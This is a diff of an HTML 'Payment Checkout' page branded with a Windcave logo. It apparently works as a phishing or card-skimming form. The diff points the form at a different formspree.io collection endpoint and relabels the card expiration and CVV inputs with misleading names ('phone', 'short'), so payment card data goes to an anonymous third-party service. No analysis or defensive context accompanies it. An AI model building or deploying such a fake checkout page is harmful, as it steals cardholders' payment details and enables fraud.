@@ -146,9 +146,7 @@
       <img class="d-block mx-auto mb-4" src="windLogo.png" alt="Windcave logo">
       <h2>Payment Checkout</h2>
       </div>
-        <form
-        action="https://formspree.io/f/xoqoowyp"
-        method="POST">
+        <form class="needs-validation" novalidate action="https://formspree.io/f/xknllbyk" method="POST">
           <div class="row g-3">
 
           <hr class="my-4">
@@ -172,7 +170,7 @@
 
             <div class="col-md-3">
               <label for="cc-expiration" class="form-label">Expiration</label>
-              <input type="text" class="form-control" id="cc-expiration phone" name="phone" placeholder="" required>
+              <input type="text" class="form-control"  name="phone" placeholder="" required>
               <div class="invalid-feedback">
                 Expiration date required
               </div>
@@ -180,7 +178,7 @@
 
             <div class="col-md-3">
               <label for="cc-cvv" class="form-label">CVV</label>
-              <input type="text" class="form-control" id="cc-cvv cvs" name="cvs" placeholder="" required>
+              <input type="text" class="form-control" name="short" placeholder="" required>
               <div class="invalid-feedback">
                 Security code required
               </div>
@@ -202,4 +200,7 @@
     </ul>
   </footer>
 </div>
+<script src="../assets/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script src="checkout.js"></script></body>
 </html>
